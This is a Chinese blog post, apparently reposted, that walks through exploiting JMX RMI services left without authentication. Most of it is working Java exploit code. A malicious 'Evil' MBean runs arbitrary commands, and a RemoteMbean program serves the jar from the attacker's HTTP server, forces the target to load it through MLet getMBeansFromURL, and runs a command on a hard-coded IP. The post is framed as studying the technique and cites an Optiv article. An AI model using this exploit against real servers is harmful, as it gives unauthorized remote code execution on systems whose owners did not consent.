---
layout: post
title: JMX RMI攻击利用
tags: [Java, JMX]
comment: false
---

From:https://github.com/k1n9/k1n9.github.io/blob/aeeb609fe6a25d67bc2dc5f990a501368fb25409/_posts/2017-08-24-attack-jmx-rmi.md

做个备份

## 0x00 简述

好几年前就有人提到这个关于JMX RMI的攻击了，个人觉得这个只是因为没有做到安全配置而导致存在的可被攻击利用的点。攻击者可以远程注册一个恶意的 MBean，再去调用里面的用于执行命令的方法达到攻击效果。代码来自参考文章，只对代码做了少许改动，他还为 metasploit 写了这个攻击模块，具体的可以看参考链接。主要还是去了解其中的攻击利用实现，用到的也都是正常功能了。

前提条件:
- 允许远程访问，没有开启认证 (com.sun.management.jmxremote.authenticate=false)
- 能够远程注册 MBean (javax.management.loading.MLet)

## 0x01 恶意MBean
EvilMBean.java:
```java
/**
 * 定义MBean接口和用来执行命令的方法
 */
public interface EvilMBean {
    public String runCommand(String cmd);
}
```
Evil.java:
```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * 类名要与实现的接口的前缀一样
 */
public class Evil implements EvilMBean {
    public String runCommand(String cmd) {
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec(cmd);
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
            String stdout_err_data = "";
            String s;
            while ((s = stdInput.readLine()) != null) {
                stdout_err_data += s + "\n";
            }
            while ((s = stdError.readLine()) != null) {
                stdout_err_data += s + "\n";
            }

            proc.waitFor();
            return stdout_err_data;
        } catch (Exception e) {
            return e.toString();
        }
    }
}
```
将上述两个java文件编译后打包成jar包:
```
jar -cvf compromise.jar EvilMBean.class Evil.class
```
这会有版本问题，1.8.131 打包的在 1.7.80 用不了。

## 0x02 利用代码
```java
import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import com.sun.net.httpserver.HttpServer;

import javax.management.MBeanServerConnection;
import javax.management.ObjectInstance;
import javax.management.ObjectName;
import javax.management.remote.JMXConnector;
import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import java.io.*;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.util.HashSet;
import java.util.Iterator;

/**
 * Created by k1n9 on 2017/8/23.
 */
public class RemoteMbean {
    private static String JARNAME = "compromise.jar";
    private static String OBJECTNAME = "MLetCompromise:name=evil,id=1";
    private static String EVILCLASS = "Evil";

    public static void main(String[] args) {
        try {
        	//开启Http服务，提供带mlet标签的html和恶意MBean的jar包
            HttpServer server = HttpServer.create(new InetSocketAddress(4141), 0);
            server.createContext("/mlet", new MLetHandler());
            server.createContext("/" + JARNAME, new JarHandler());
            server.setExecutor(null);
            server.start();
			//这里可以改成args的参数就可以在命令行下使用了，JMX的ip，端口，要执行的命令
            connectAndOwn("10.18.224.59", "2333", "id");

            server.stop(0);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    static void connectAndOwn(String serverName, String port, String command) {
        try {
        	//建立连接
            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port + "/jmxrmi");
            System.out.println("URL: " + u + ", connecting");

            JMXConnector c = JMXConnectorFactory.connect(u, null);
            System.out.println("Connected: " + c.getConnectionId());

            MBeanServerConnection m = c.getMBeanServerConnection();

            ObjectInstance evil_bean = null;
            try {
                evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAME));
            } catch (Exception e) {
                evil_bean = null;
            }

            if (evil_bean == null) {
                System.out.println("Trying to create bean...");
                ObjectInstance evil = null;
                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (javax.management.InstanceAlreadyExistsException e) {
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }

                System.out.println("Loaded " + evil.getClassName());
				//调用 getMBeansFromURL 从远程服务器获取 MBean
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                        new Object[] {String.format("http://%s:4141/mlet", InetAddress.getLocalHost().getHostAddress())},
                        new String[] {String.class.getName()}
                        );
                HashSet res_set = (HashSet)res;
                Iterator itr = res_set.iterator();
                Object nextObject = itr.next();
                if (nextObject instanceof Exception) {
                    throw ((Exception)nextObject);
                }
                evil_bean = ((ObjectInstance)nextObject);
            }
				//调用恶意 MBean 中用于执行命令的函数
            System.out.println("Loaded class: " + evil_bean.getClassName() + " object " + evil_bean.getObjectName());
            System.out.println("Calling runCommand with: " + command);
            Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{command}, new String[]{String.class.getName()});
            System.out.println("Result: " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static class MLetHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
        	/**
             * mlet 标签
             * <MLET
			 * CODE = class | OBJECT = serfile
			 * ARCHIVE = "archiveList"
			 * [CODEBASE = codebaseURL]
			 * [NAME = mbeanname]
			 * [VERSION = version]
			 * >
			 * [arglist]
			 * </MLET>
             */
            String respone = String.format("<HTML><mlet code=%s archive=%s name=%s></mlet></HTML>", EVILCLASS, JARNAME, OBJECTNAME);
            System.out.println("Sending mlet: " + respone + "\n");
            t.sendResponseHeaders(200, respone.length());
            OutputStream os = t.getResponseBody();
            os.write(respone.getBytes());
            os.close();
        }
    }

    static class JarHandler implements HttpHandler {
        public void handle(HttpExchange t) throws IOException {
            System.out.println("Request made for JAR...");
            //这里的 compromise.jar 可以根据实际的路径来修改
            File file = new File("/Users/k1n9/Workspace/Java/compromise.jar");
            byte[] bytearray = new byte[(int)file.length()];
            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);
            bis.read(bytearray, 0 , bytearray.length);
            t.sendResponseHeaders(200, file.length());
            OutputStream os = t.getResponseBody();
            os.write(bytearray, 0, bytearray.length);
            os.close();
        }
    }
}
```

## 0x03 测试
![](https://ooo.0o0.ooo/2017/08/24/599e8c1f24520.png)

## 参考
- https://www.optiv.com/blog/exploiting-jmx-rmi
